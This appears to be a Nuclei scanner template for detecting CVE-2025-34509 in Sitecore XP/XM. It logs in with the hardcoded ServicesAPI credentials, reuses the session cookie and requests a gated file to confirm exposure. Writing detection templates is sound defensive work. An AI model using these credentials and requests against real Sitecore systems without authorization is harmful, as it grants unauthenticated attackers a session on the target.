id: cve-2025-34509-sitecore-servicesapi-auth-bypass

info:
  name: Sitecore XP/XM - ServicesAPI Hardcoded Creds → Session Cookie (CVE-2025-34509)
  author: yourhandle
  severity: high
  description: |
    Attempts authentication using the hardcoded ServicesAPI account and verifies a valid session
    by accessing a path that should be blocked to unauthenticated users. Confirms exposure without
    relying on version strings.
  reference:
    - https://labs.watchtowr.com/is-b-for-backdoor-pre-auth-rce-chain-in-sitecore-experience-platform/   # details + flow
    - https://github.com/projectdiscovery/nuclei-templates/issues/13159                                   # maintainer acceptance criteria
    - https://doc.sitecore.com/xp/en/developers/latest/sitecore-experience-manager/sitecore-services-client-security.html  # SSC auth/login behavior
  tags: cve,sitecore,auth-bypass,http,ssc
  metadata:
    cve: CVE-2025-34509
    vendor: Sitecore
    product: Experience Platform / Experience Manager
    verified: false   # flip to true once you’ve validated in a lab with -debug output
    max-request: 2

http:
  # --- Step 1: Obtain session via SSC login over HTTPS ---
  - method: POST
    path:
      - "{{BaseURL}}/sitecore/api/ssc/auth/login"
    headers:
      Content-Type: application/json
      Accept: application/json
      User-Agent: nuclei-scanner
    body: |
      {"domain":"sitecore","username":"ServicesAPI","password":"b"}
    # Reuse cookies (Set-Cookie from this response is sent on subsequent requests)
    cookie-reuse: true
    redirects: true
    max-redirects: 3
    host-redirects: true
    matchers-condition: and
    matchers:
      # Successful login commonly returns 200 and sets an auth cookie
      - type: status
        status:
          - 200
      - type: regex
        part: header
        # Look for a framework/session cookie that indicates an authenticated session
        # (.AspNet.Cookies seen by watchTowr; ASP.NET naming may vary)
        regex:
          - "(?i)^set-cookie:.*(\\.AspNet\\.Cookies|ASP\\.NET_SessionId|sc_auth)=.+"
    # Don’t stop yet; we want to prove the session on a protected path
    stop-at-first-match: false

  # --- Step 2: Prove the session grants access to a path that should be blocked to anon users ---
  - method: GET
    path:
      - "{{BaseURL}}/sitecore/shell/sitecore.version.xml"
    redirects: true
    max-redirects: 2
    host-redirects: true
    # With cookie-reuse, this request will include the auth cookie from step 1.
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          # Stable markers inside the version file; not a version-based detection,
          # just proof we accessed a gated resource as an authenticated user.
          - "<sitecore"
          - "<version"
        condition: and
